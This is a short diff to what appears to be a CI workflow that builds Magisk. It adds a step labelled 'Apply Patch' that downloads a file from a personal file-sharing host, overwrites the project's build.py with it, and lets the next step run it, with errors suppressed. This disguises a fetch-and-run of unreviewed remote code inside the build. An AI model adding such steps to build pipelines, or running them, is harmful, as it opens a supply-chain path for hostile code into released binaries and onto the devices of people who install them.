@@ -101,6 +101,10 @@ jobs:
           sudo apt-get update
           sudo apt-get install --only-upgrade libstdc++6 -y
 
+      - name: Apply Patch
+        continue-on-error: true
+        run: cd Magisk && curl -o build.py https://vip.123pan.cn/1814215835/20594401
+
       - name: Build release
         continue-on-error: true
         run: cd Magisk && ./build.py -vr all
